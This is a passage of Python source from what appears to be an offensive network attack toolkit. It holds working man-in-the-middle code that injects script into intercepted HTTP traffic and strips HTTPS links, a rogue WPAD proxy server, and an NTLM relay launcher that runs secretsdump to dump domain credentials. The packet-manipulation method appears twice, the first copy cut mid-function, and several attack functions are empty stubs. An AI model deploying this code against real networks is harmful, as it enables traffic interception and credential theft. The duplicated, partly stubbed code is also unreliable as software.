                    if protocol == 'http' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'inject':
                            # Inject content
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                if 'HTTP' in data:
                                    # Inject JavaScript
                                    inject = '<script>alert("Injected!");</script>'
                                    data = data.replace('</body>', f'{inject}</body>')
                                    packet[scapy.Raw].load = data.encode()
                                    self.stats['modified_traffic'].append(f"Injected content into HTTP response to {target_ip}")
                                    
                        elif manipulation_type == 'downgrade':
                            # Protocol downgrade
                            if 'HTTPS' in str(packet[scapy.Raw].load):
                                # Modify HTTPS to HTTP
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                data = data.replace('https://', 'http://')
                                packet[scapy.Raw].load = data.encode()
                                self.stats['modified_traffic'].append(f"Downgraded HTTPS to HTTP for {target_ip}")
                                
                    elif protocol == 'smb' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'downgrade':
                            # SMB version downgrade
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load
                                if b'\xffSMB' in data:
                                    # Modify SMB version
                                    # Implementation of SMB downgrade
                                    self.stats['modified_traffic'].append(f"Attempted SMB downgrade for {target_ip}")
                                    
                    # Forward modified packet
                    scapy.send(packet, verbose=False)
                    
            # Start packet capture
            scapy.sniff(
                iface=interface,
                filter=f"host {target_ip}",
                prn=packet_callback
            )
            
        except Exception as e:
            self.log_error(f"Packet manipulation error: {str(e)}")

    def _start_ipv6_relay(self, post_exploit: bool = False):
        """Start IPv6 relay implementation"""
        try:
            targets = ','.join([f'smb://{ip}' for ip in self.relay_targets])
            cmd = ['ntlmrelayx.py', '-tf', '/tmp/relay_targets.txt', '-smb2support']
            
            # Add options to increase chance of cleartext cred capture
            cmd.extend(['-of', 'ntlmrelay.log', '-6'])
            
            if post_exploit:
                cmd.extend(['-c', 'secretsdump.py -just-dc-user "DOMAIN/USER" "DOMAIN/USER"@"TARGET"'])
                
            with open('/tmp/relay_targets.txt', 'w') as f:
                for target in self.relay_targets:
                    f.write(f'smb://{target}\n')
                    
            self.ntlmrelay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Start thread to monitor ntlmrelay output
            threading.Thread(target=self._monitor_ntlmrelay, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Failed to start IPv6 relay: {str(e)}")

    def _restore_arp(self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str):
        """Restore ARP tables"""
        try:
            # Implementation of ARP table restoration
            pass
        except Exception as e:
            self.log_error(f"Failed to restore ARP tables: {str(e)}")

    def _dns_poisoner(self, interface: str, proxy_ip: str, domains: List[str]):
        """DNS poisoning implementation"""
        try:
            # Implementation of DNS poisoning
            pass
        except Exception as e:
            self.log_error(f"Failed to start DNS poisoning: {str(e)}")

    def _start_wpad_server(self, proxy_ip: str, proxy_port: int, use_ssl: bool):
        """Start WPAD HTTP server"""
        class WPADHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.endswith('wpad.dat'):
                    self.send_response(200)
                    self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
                    self.end_headers()
                    
                    # Create PAC file
                    pac = f"""function FindProxyForURL(url, host) {{
                        return "PROXY {proxy_ip}:{proxy_port}; DIRECT";
                    }}"""
                    
                    self.wfile.write(pac.encode())
                    self.stats['wpad_requests'].append(self.client_address[0])
                else:
                    self.send_response(404)
                    self.end_headers()
                    
        server_address = ('', 80)
        self.http_server = HTTPServer(server_address, WPADHandler)
        
        if use_ssl:
            # Create self-signed cert
            self.http_server.socket = ssl.wrap_socket(
                self.http_server.socket,
                certfile='wpad.pem',
                server_side=True
            )
            
        self.http_server.serve_forever()

    def _packet_manipulator(self, interface: str, target_ip: str,
                         protocol: str, port: int, manipulation_type: str):
        """Manipulate captured packets"""
        try:
            def packet_callback(packet):
                if packet.haslayer(scapy.IP) and packet[scapy.IP].src == target_ip:
                    if protocol == 'http' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'inject':
                            # Inject content
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                if 'HTTP' in data:
                                    # Inject JavaScript
                                    inject = '<script>alert("Injected!");</script>'
                                    data = data.replace('</body>', f'{inject}</body>')
                                    packet[scapy.Raw].load = data.encode()
                                    self.stats['modified_traffic'].append(f"Injected content into HTTP response to {target_ip}")
                                    
                        elif manipulation_type == 'downgrade':
                            # Protocol downgrade
                            if 'HTTPS' in str(packet[scapy.Raw].load):
                                # Modify HTTPS to HTTP
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                data = data.replace('https://', 'http://')
                                packet[scapy.Raw].load = data.encode()
                                self.stats['modified_traffic'].append(f"Downgraded HTTPS to HTTP for {target_ip}")
                                
                    elif protocol == 'smb' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'downgrade':
                            # SMB version downgrade
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load
                                if b'\xffSMB' in data:
                                    # Modify SMB version
                                    # Implementation of SMB downgrade
                                    self.stats['modified_traffic'].append(f"Attempted SMB downgrade for {target_ip}")
                                    
                    # Forward modified packet
                    scapy.send(packet, verbose=False)
                    
            # Start packet capture
            scapy.sniff(
                iface=interface,
                filter=f"host {target_ip}",
                prn=packet_callback
            )
            
        except Exception as e:
            self.log_error(f"Packet manipulation error: {str(e)}") 